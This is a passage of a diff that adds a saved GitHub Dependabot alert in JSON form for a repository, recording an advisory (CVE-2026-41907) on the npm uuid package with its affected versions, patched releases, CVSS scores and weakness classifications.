+          "value": "GHSA-w5hq-g745-h8pq",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-41907",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/releases/tag/v14.0.0"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-41907"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/releases/tag/v11.1.1"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/releases/tag/v12.0.1"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/releases/tag/v13.0.1"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-w5hq-g745-h8pq"
+        }
+      ],
+      "published_at": "2026-04-22T20:53:24Z",
+      "updated_at": "2026-05-21T18:25:57Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "uuid"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": ">= 12.0.0, < 12.0.1",
+          "first_patched_version": {
+            "identifier": "12.0.1"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "uuid"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": ">= 13.0.0, < 13.0.1",
+          "first_patched_version": {
+            "identifier": "13.0.1"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "uuid"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": "< 11.1.1",
+          "first_patched_version": {
+            "identifier": "11.1.1"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+          "score": 6.3
+        }
+      },
+      "epss": {
+        "percentage": 0.00337,
+        "percentile": 0.26518
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+        "score": 7.5
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-787",
+          "name": "Out-of-bounds Write"
+        },
+        {
+          "cwe_id": "CWE-1285",
+          "name": "Improper Validation of Specified Index, Position, or Offset in Input"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "uuid"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": "< 11.1.1",
+      "first_patched_version": {
+        "identifier": "11.1.1"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/1",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/1",
+    "created_at": "2026-08-21T01:04:39Z",
+    "updated_at": "2026-08-21T01:04:39Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  }
+]
